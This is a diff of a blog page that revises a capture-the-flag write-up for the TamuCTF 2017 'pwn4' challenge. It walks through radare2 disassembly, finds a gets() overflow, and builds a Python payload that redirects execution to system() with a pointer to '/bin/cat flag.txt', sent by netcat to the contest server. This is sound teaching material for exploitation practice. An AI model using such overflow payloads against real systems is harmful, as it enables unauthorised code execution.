@@ -82,7 +82,7 @@ ga('send', 'pageview');
 							<strong>
                             		<strong>Tzaoh</strong>
 							</strong>
-                            <span>May 30, 2017</span>
+                            <span>Aug 11, 2017</span>
                         </div>
                         <div class="section-spacer"></div>
                     </div>
@@ -91,96 +91,232 @@ ga('send', 'pageview');
 
 <p><img src="/assets/TamuCTF2017/pwn4/1-pwn4_description.png" alt="Pwn4 challenge description" /></p>
 
-<p>Is curious that this specific challenge is more worthy than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>). As we will see it is way easier.</p>
-
-<p>Lets take a look to the code with r2</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ r2 pwn4 -c <span class="s1">&#39;aaa; afl&#39;</span>
+<p>Is curious that this specific challenge had more value than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>).<br />
+As we will see below, it was way easier. Lets take a look with r2.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn4/pwn4
+$ r2 -A -c <span class="s1">&#39;afl&#39;</span> pwn4
 </code></pre></div>
 
-<p><img src="/assets/TamuCTF2017/pwn4/2-pwn4_functions.png" alt="Pwn4 functions" /></p>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+<span class="s">0x08048330</span>  <span class="mh">  3 35         </span>  sym._init
+<span class="s">0x08048353</span>  <span class="mh">  1 25         </span>  fcn.08048353
+<span class="s">0x0804836c</span>  <span class="mh">  1 4          </span>  sub.gets_12_36c
+<span class="s">0x08048370</span>  <span class="mh">  1 6          </span>  sym.imp.gets
+<span class="s">0x08048376</span>  <span class="mh">  2 10   -&gt; 22 </span>  fcn.08048376
+<span class="s">0x08048380</span>  <span class="mh">  1 6          </span>  sym.imp.puts
+<span class="s">0x08048386</span>  <span class="mh">  2 10   -&gt; 22 </span>  fcn.08048386
+<span class="s">0x08048390</span>  <span class="mh">  1 6          </span>  sym.imp.system
+<span class="s">0x08048396</span>  <span class="mh">  2 10   -&gt; 22 </span>  fcn.08048396
+<span class="s">0x080483a0</span>  <span class="mh">  1 6          </span>  sym.imp.__libc_start_main
+<span class="s">0x080483a6</span>  <span class="mh">  2 10   -&gt; 22 </span>  fcn.080483a6
+<span class="s">0x080483b0</span>  <span class="mh">  1 6          </span>  sym.imp.setvbuf
+<span class="s">0x080483b6</span>  <span class="mh">  2 10   -&gt; 22 </span>  fcn.080483b6
+<span class="s">0x080483c0</span>  <span class="mh">  1 1          </span>  sub.__gmon_start___252_3c0
+<span class="s">0x080483c1</span>  <span class="mh">  1 15         </span>  fcn.080483c1
+<span class="s">0x080483d0</span>  <span class="mh">  1 33         </span>  entry0
+<span class="s">0x080483f1</span>  <span class="mh">  1 1          </span>  fcn.080483f1
+<span class="s">0x08048400</span>  <span class="mh">  1 4          </span>  sym.__x86.get_pc_thunk.bx
+<span class="s">0x08048410</span>  <span class="mh">  4 43         </span>  sym.deregister_tm_clones
+<span class="s">0x0804843c</span>  <span class="mh">  4 57         </span>  fcn.0804843c
+<span class="s">0x08048475</span>  <span class="mh">  3 41         </span>  fcn.08048475
+<span class="s">0x080484a0</span>  <span class="mh">  8 43   -&gt; 93 </span>  sym.frame_dummy
+<span class="hll"><span class="s">0x080484cb</span>  <span class="mh">  1 25         </span>  sym.flag_func
+</span><span class="hll"><span class="s">0x080484e4</span>  <span class="mh">  1 25         </span>  sym.func2
+</span><span class="hll"><span class="s">0x080484fd</span>  <span class="mh">  1 24         </span>  sym.func1
+</span><span class="hll"><span class="s">0x08048515</span>  <span class="mh">  1 71         </span>  sym.main
+</span><span class="s">0x08048560</span>  <span class="mh">  4 93         </span>  sym.__libc_csu_init
+<span class="s">0x080485bd</span>  <span class="mh">  1 5          </span>  fcn.080485bd
+<span class="s">0x080485c2</span>  <span class="mh">  1 22         </span>  fcn.080485c2
+</code></pre></div>
+
 
 <p>We can see four interesting functions:</p>
 
-<ul>
-<li><strong><code>sym.flag_func()</code></strong> at <code>0x080484cb</code></li>
-<li><strong><code>sym.func2()</code></strong> at <code>0x080484e4</code></li>
-<li><strong><code>sym.func1()</code></strong> at <code>0x080484fd</code></li>
-<li><strong><code>sym.main()</code></strong> at <code>0x08048515</code></li>
-</ul>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080483d0<span class="o">]</span>&gt; s sym.flag_func<span class="p">;</span> V<span class="p">;</span> p<span class="p">;</span> p
-<span class="c1"># be positioned at start of sym.flag_func; Change to Visual mode; change mode view*2</span>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080483d0</span>]<span class="o">&gt;</span> <span class="nf">s</span> sym.flag_func; Vp
+[0x080484cb 16% 240 pwn4]&gt; pd $r @ sym.flag_func                         
+<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>flag_func <span class="m">25</span>
+<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>flag_func ();
+<span class="k">│</span>           <span class="s">0x080484cb</span>      55             <span class="k">push</span> <span class="k">ebp</span>
+<span class="k">│</span>           <span class="s">0x080484cc</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>                       
+<span class="k">│</span>           <span class="s">0x080484ce</span>      83ec08         <span class="k">esp</span> <span class="o">-=</span> <span class="m">8</span>                     
+<span class="k">│</span>           <span class="s">0x080484d1</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                 
+<span class="k">│</span>         <span class="c">; &quot;/bin/cat flag2.txt&quot;        </span>
+<span class="hll"><span class="k">│</span>           <span class="s">0x080484d4</span>      68e0850408     <span class="k">push</span> <span class="k">str</span><span class="o">.</span>_bin_cat_flag2.txt
+</span><span class="k">│</span>         <span class="c">; int system(const char *string) ; sym.imp.system</span>
+<span class="hll"><span class="k">│</span>           <span class="s">0x080484d9</span>      e8b2feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>system ()
+</span><span class="k">│</span>           <span class="s">0x080484de</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
+<span class="k">│</span>           <span class="s">0x080484e1</span>      90                                   
+<span class="k">│</span>           <span class="s">0x080484e2</span>      c9                                   
+<span class="k">└</span>           <span class="s">0x080484e3</span>      c3                                     
+<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>func2 <span class="m">25</span>                                             
+<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>func2 ()<span class="c">;                                                </span>
+<span class="k">│</span>           <span class="s">0x080484e4</span>      55             <span class="k">push</span> <span class="k">ebp</span>              
+<span class="k">│</span>           <span class="s">0x080484e5</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>             
+<span class="k">│</span>           <span class="s">0x080484e7</span>      83ec08         <span class="k">esp</span> <span class="o">-=</span> <span class="m">8</span>              
+<span class="k">│</span>           <span class="s">0x080484ea</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>            
+<span class="k">│</span>           <span class="s">0x080484ed</span>      68f3850408     <span class="k">push</span> <span class="k">str</span><span class="o">.</span>Nothing_to_see_here
+<span class="k">│</span>         <span class="c">; int puts(const char *s)                      </span>
+<span class="k">│</span>           <span class="s">0x080484f2</span>      e889feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>puts ()
+<span class="k">│</span>           <span class="s">0x080484f7</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
+<span class="k">│</span>           <span class="s">0x080484fa</span>      90                                               
+<span class="k">│</span>           <span class="s">0x080484fb</span>      c9                                   
+<span class="k">└</span>           <span class="s">0x080484fc</span>      c3                                   
+<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>func1 <span class="m">24</span>
+<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>func1 ();
+<span class="k">│</span>           <span class="c">; var int local_ch @ ebp-0xc</span>
+<span class="k">│</span>              <span class="c">; CALL XREF from 0x0804854a (sym.main)</span>
+<span class="k">│</span>           <span class="s">0x080484fd</span>      55             <span class="k">push</span> <span class="k">ebp</span>
+<span class="k">│</span>           <span class="s">0x080484fe</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>
+<span class="k">│</span>           <span class="s">0x08048500</span>      83ec18         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0x18</span>
+<span class="k">│</span>           <span class="s">0x08048503</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>
+<span class="k">│</span>           <span class="s">0x08048506</span>      8d45f4         <span class="k">eax</span> <span class="o">=</span> [<span class="k">local_ch</span>]
+<span class="k">│</span>           <span class="s">0x08048509</span>      50             <span class="k">push</span> <span class="k">eax</span>
+<span class="k">│</span>         <span class="c">; char*gets(char *s)</span>
+<span class="hll"><span class="k">│</span>           <span class="s">0x0804850a</span>      e861feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>gets ()           
+</span><span class="k">│</span>           <span class="s">0x0804850f</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
+<span class="k">│</span>           <span class="s">0x08048512</span>      90                        
+<span class="k">│</span>           <span class="s">0x08048513</span>      c9                        
+<span class="k">└</span>           <span class="s">0x08048514</span>      c3                          
+<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>main <span class="m">71</span>         
+<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>main ();
+<span class="k">│</span>           <span class="c">; var int local_4h_2 @ ebp-0x4</span>
+<span class="k">│</span>           <span class="c">; var int local_4h @ esp+0x4</span>
+<span class="k">│</span>              <span class="c">; DATA XREF from 0x080483e7 (entry0)</span>
+<span class="k">│</span>           <span class="s">0x08048515</span>      8d4c2404       <span class="k">ecx</span> <span class="o">=</span> [<span class="k">local_4h</span>]
+<span class="k">│</span>           <span class="s">0x08048519</span>      83e4f0         <span class="k">esp</span> <span class="o">&amp;=</span> <span class="mh">0xfffffff0</span>
+<span class="k">│</span>           <span class="s">0x0804851c</span>      ff71fc         <span class="k">push</span> dword [<span class="k">ecx</span> <span class="o">-</span> <span class="m">4</span>]
+<span class="k">│</span>           <span class="s">0x0804851f</span>      55             <span class="k">push</span> <span class="k">ebp</span>
+<span class="k">│</span>           <span class="s">0x08048520</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>
+<span class="k">│</span>           <span class="s">0x08048522</span>      51             <span class="k">push</span> <span class="k">ecx</span>
+<span class="k">│</span>           <span class="s">0x08048523</span>      83ec04         <span class="k">esp</span> <span class="o">-=</span> <span class="m">4</span>
+<span class="k">│</span>           <span class="s">0x08048526</span>      a13ca00408     <span class="k">eax</span> <span class="o">=</span> dword <span class="k">obj</span><span class="o">.</span>stdout
+<span class="k">│</span>           <span class="s">0x0804852b</span>      6a00           <span class="k">push</span> <span class="m">0</span>
+<span class="k">│</span>           <span class="s">0x0804852d</span>      6a00           <span class="k">push</span> <span class="m">0</span>
+<span class="k">│</span>           <span class="s">0x0804852f</span>      6a02           <span class="k">push</span> <span class="m">2</span>
+<span class="k">│</span>           <span class="s">0x08048531</span>      50             <span class="k">push</span> <span class="k">eax</span>
+<span class="k">│</span>         <span class="c">; int setvbuf(FILE*stream, char*buf, int mode, size_t size)</span>
+<span class="k">│</span>           <span class="s">0x08048532</span>      e879feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>setvbuf ()
+<span class="k">│</span>           <span class="s">0x08048537</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
+<span class="k">│</span>           <span class="s">0x0804853a</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>
+<span class="k">│</span>           <span class="s">0x0804853d</span>      6807860408     <span class="k">push</span> <span class="k">str</span><span class="o">.</span>I_require_an_input:
+<span class="k">│</span>         <span class="c">; int puts(const char *s)</span>
+<span class="k">│</span>           <span class="s">0x08048542</span>      e839feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>puts ()
+<span class="k">│</span>           <span class="s">0x08048547</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
+<span class="hll"><span class="k">│</span>           <span class="s">0x0804854a</span>      e8aeffffff     <span class="k">sym</span><span class="o">.</span>func1 ()
+</span><span class="k">│</span>           <span class="s">0x0804854f</span>      b800000000     <span class="k">eax</span> <span class="o">=</span> <span class="m">0</span>
+<span class="k">│</span>           <span class="s">0x08048554</span>      8b4dfc         <span class="k">ecx</span> <span class="o">=</span> dword [<span class="k">local_4h_2</span>]
+<span class="k">│</span>           <span class="s">0x08048557</span>      c9                                     
+<span class="k">│</span>           <span class="s">0x08048558</span>      8d61fc         <span class="k">esp</span> <span class="o">=</span> [<span class="k">ecx</span> <span class="o">-</span> <span class="m">4</span>]
+<span class="k">└</span>           <span class="s">0x0804855b</span>      c3                                               
 </code></pre></div>
 
-<p>Here they are, take a look at them.</p>
 
-<p><img src="/assets/TamuCTF2017/pwn4/3-pwn4_functions_code.png" alt="Pwn4 functions code" /></p>
+<blockquote>
+<p>By the way the command <code>s sym.flag_func; Vp</code> can be splitted and explained like this:<br />
+<code>s sym.flag_func</code> - set the position of the cursor at the beginning of the function.<br />
+<code>V</code> - Change the visual mode.<br />
+<code>p</code> - change mode view.</p>
+</blockquote>
 
-<p>Obviously we should try to execute that <strong><code>sym.flag_func()</code></strong>, it seems it will try print a file (<strong>flag2.txt</strong>, strange name right? why 2?) using the <code>cat</code> command on the remote server. But that function is never called. You can check it on your own with:</p>
+<p>Here they are, lets take a look at those functions.</p>
 
-<pre><code>[0x080484f7]&gt; axt sym.flag_func
-</code></pre>
+<p>Obviously we should try to execute <code>sym.flag_func()</code> function, it seems it will try print a file called <code>flag2.txt</code> (strange name right? why 2?) using the <code>cat</code> command on the remote server. But that function is never called. You can check it by yourself with:</p>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080484f7</span>]<span class="o">&gt;</span> <span class="nf">axt</span> sym.flag_func
+</code></pre></div>
 
-<p>Then we need to keep looking a bit more.</p>
+<p>Then we need to dig a bit more.</p>
 
 <ol>
-<li><del><strong><code>sym.func2()</code></strong></del> is just printing a message (it even tells you not to waste your time with it). So we can strikethrough.</li>
-<li><strong><code>sym.func1()</code></strong> is a bit more interesting because it is using the unsecure function <strong><code>gets()</code></strong>.<br />
-Thanks to this function we would be able to overwrite the <strong><code>$eip</code></strong> register. We dont need to cross our fingers a lot of time because we fastly see that <strong><code>sym.func1()</code></strong> is being called from <strong><code>main()</code></strong>! yay!</li>
+<li><code>sym.func2()</code> is just printing a message (it even tells you not to waste your time with it). So we can ignore this one.</li>
+<li><code>sym.func1()</code> is a bit more interesting because it is using the unsecure function <code>gets()</code>. If it is called somewhere, we would be able to overwrite the <code>$eip</code> register.</li>
+<li>We dont need to cross our fingers a lot of time because we fastly see that <code>sym.func1()</code> is being called from <code>main()</code>! yay! ✌️ .</li>
 </ol>
 
-<p>Lets figure out, how many bytes do we need to overwrite <strong><code>$eip</code></strong> register.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484f7<span class="o">]</span>&gt; q <span class="c1"># Close r2 (we need to open the binary again with debug mode).</span>
-$ pwn cyclic <span class="m">40</span> <span class="c1"># To generate string with unique subsequences.</span>
+<p>Lets figure out, how many bytes do we need to overwrite <code>$eip</code> register.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ pwn cyclic <span class="m">40</span> <span class="p">;</span> To generate string with unique subsequences.
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
-$ r2 -X <span class="s2">&quot;stdin=\&quot;`pwn cyclic 40`\&quot;&quot;</span> -d pwn4 -c <span class="s1">&#39;aaa; dc;&#39;</span>
-.
-.
-<span class="o">[</span>0x61616165<span class="o">]</span>&gt; q
-$ pwn cyclic -l 0x61616165
+$ r2 -R <span class="s2">&quot;stdin=\&quot;`pwn cyclic 40`\&quot;&quot;</span> -A -d -c <span class="s1">&#39;dc&#39;</span> pwn4
+</code></pre></div>
+
+<p><div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>Process with PID <span class="mh">12102</span> started<span class="o">...</span>
+= attach <span class="mh">12102</span> <span class="mh">12102</span>
+bin<span class="o">.</span>baddr <span class="mh">0x08048000</span>
+Using <span class="mh">0x8048000</span>
+Assuming filepath <span class="o">/</span>root<span class="o">/</span>pwn<span class="mh">4</span>
+asm<span class="o">.</span>bits <span class="mh">32</span>
+[x] Analyze all flags starting with sym. and entry0 (aa)
+TODO<span class="o">:</span> esil<span class="o">-</span>vm not initialized
+[Cannot determine xref search boundariesr references (aar)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+ptrace <span class="err">(</span>PT_ATTACH)<span class="o">:</span> Operation not permitted
+= attach <span class="mh">12102</span> <span class="mh">12102</span>
+I require an input<span class="o">:</span>
+child stopped with signal <span class="mh">11</span>
+<span class="hll">[+] SIGNAL 11 errno=0 addr=0x61616165 code=1 ret=0
+</span><span class="hll">[<span class="mh">0x61616165</span>]<span class="o">&gt;</span>
+</span></code></pre></div>
+</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ pwn cyclic -l 0x61616165
 <span class="m">16</span>
 </code></pre></div>
 
-<p>So, we can overwrite the <strong><code>$eip</code></strong> register writing the next following 4 bytes (from byte 17 to 20)!<br />
-Now we create a file with the previously commented file (<strong><code>flag2.txt</code></strong>) to try this out.</p>
+<p>So, we can overwrite the <code>$eip</code> register writing the next 4 bytes (from byte 17 to 20)!<br />
+Now we create a file with the previously commented file (<code>flag2.txt</code>) to try this out.</p>
+
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ <span class="nb">echo</span> This is the flag &gt; flag2.txt
 $ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> ./pwn4
+I require an input:
+<span class="hll">This is the flag
+</span>Segmentation fault
 </code></pre></div>
 
-<p><img src="/assets/TamuCTF2017/pwn4/4-pwn4_printing_flag2.png" alt="Pwn4 printing flag2.txt" /></p>
 
 <p>Good! what will the remote server say?</p>
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
+I require an input:                                                                              Did you really think it would be that easy?
 </code></pre></div>
 
-<p><img src="/assets/TamuCTF2017/pwn4/5-pwn4_remote_flag2_content.png" alt="Pwn4 printing flag2.txt" /></p>
-
-<p>Ouch! that file was just a decoy. There must be a file named <strong><code>flag.txt</code></strong>.
+<p>Ouch! that file was just a decoy. There must be a another one named <code>flag.txt</code> waiting for us.
 &gt; But how could we executed it? There is only one function which print a file and its name is hardcoded.</p>
 
-<p>Well, that is not a problem, because there is a call to <strong><code>system()</code></strong>.
-The only thing we need to do is to pass a different argument: <strong><code>cat flag.txt</code></strong> instead of <strong><code>cat flag2.txt</code></strong>.</p>
+<p>Well, that is not a problem, because there is a call to <code>system()</code>.
+The only thing we need to do is to pass a different argument: <code>cat flag.txt</code> instead of <code>cat flag2.txt</code>.</p>
 
-<p>If you inspect all the strings of the binary you may find surprise:
-<img src="/assets/TamuCTF2017/pwn4/6-pwn4_pointer_flag_file.png" alt="Pwn4 printing flag2.txt" />:</p>
+<p>If you inspect all the strings of the binary you may find surprise:</p>
 
-<p>As you may know, in order to pass the arguments to the function they need to be pushed into the stack. In case of a string not its value but its reference (a pointer <strong><code>0x0804a028</code></strong>.</p>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x61616165</span>]<span class="o">&gt;</span> <span class="nf">iz</span>
+vaddr<span class="o">=</span><span class="mh">0x080485e0</span> paddr<span class="o">=</span><span class="mh">0x000005e0</span> ordinal<span class="o">=</span><span class="mh">000</span> sz<span class="o">=</span><span class="mh">19</span> len<span class="o">=</span><span class="mh">18</span> section<span class="o">=.</span>rodata type<span class="o">=</span>ascii string<span class="o">=/</span>bin<span class="o">/</span>cat flag<span class="mh">2</span><span class="o">.</span>txt
+vaddr<span class="o">=</span><span class="mh">0x080485f3</span> paddr<span class="o">=</span><span class="mh">0x000005f3</span> ordinal<span class="o">=</span><span class="mh">001</span> sz<span class="o">=</span><span class="mh">20</span> len<span class="o">=</span><span class="mh">19</span> section<span class="o">=.</span>rodata type<span class="o">=</span>ascii string<span class="o">=</span>Nothing to see here
+vaddr<span class="o">=</span><span class="mh">0x08048607</span> paddr<span class="o">=</span><span class="mh">0x00000607</span> ordinal<span class="o">=</span><span class="mh">002</span> sz<span class="o">=</span><span class="mh">20</span> len<span class="o">=</span><span class="mh">19</span> section<span class="o">=.</span>rodata type<span class="o">=</span>ascii string<span class="o">=</span>I require an input<span class="o">:</span>
+<span class="hll">vaddr<span class="o">=</span><span class="mh">0x0804a028</span> paddr<span class="o">=</span><span class="mh">0x00001028</span> ordinal<span class="o">=</span><span class="mh">000</span> sz<span class="o">=</span><span class="mh">18</span> len<span class="o">=</span><span class="mh">17</span> section<span class="o">=.</span>data type<span class="o">=</span>ascii string<span class="o">=/</span>bin<span class="o">/</span>cat flag<span class="o">.</span>txt
+</span></code></pre></div>
 
-<p>Because we can overwrite the stack we can &ldquo;imitate&rdquo; a push into it:
-1. Instead of starting in the address of <strong><code>sym.flag_func()</code></strong> (<strong><code>0x080484cb</code></strong>) we will use <strong><code>system()</code></strong> one (<strong><code>0x080484d9</code></strong>).
-    <code>bash
-    $ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot;)'
-</code>
-2. We need to push the pointer to the string to indicate <strong><code>system()</code></strong> which is its argument.
-    <code>bash
-    $ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)'
-</code></p>
+
+<p>As you may know, in order to pass the arguments to <code>system</code> they need to be pushed into the stack. In case of a string not its value but its reference (a pointer <code>0x0804a028</code> in this case).</p>
+
+<p>Because we can overwrite the stack we can &ldquo;imitate&rdquo; a push into it:</p>
+
+<ol>
+<li>Instead of starting in the address of <code>sym.flag_func()</code> (<code>0x080484cb</code>) we will use <code>system()</code> one (<code>0x080484d9</code>).<br />
+<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot;)'</code><br /></li>
+<li>We need to push the pointer to the string to indicate <code>system()</code> which is its argument.<br />
+<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)'</code></li>
+</ol>
 
 <p>Lets send to the server:</p>
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
+I require an input:
+gigem<span class="o">{</span>R3TURN_0R13NT3D_PR0F1T<span class="o">}</span>
 </code></pre></div>
 
-<p><img src="/assets/TamuCTF2017/pwn4/7-pwn4_answer.png" alt="Pwn4 printing flag2.txt" />
-Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
+<p>Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
 
 <h3 id="complete-video">Complete video</h3>
 
@@ -203,13 +339,13 @@ Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
                     </div>  
                 </div>                
                 <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
-                    <div class="section-spacer"></div>
-                    <a href="/post/tamuctf2017/pwn1/">
-                        Newer
+                    <a href="/post/tamuctf2017/pwn3/">
                         <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                            <i class="icon ion-android-arrow-forward"></i>
+                        <i class="icon ion-android-arrow-back"></i>
                         </button>
+                        Older
                     </a>
+                    <div class="section-spacer"></div>
                 </nav>
  
             </div>        
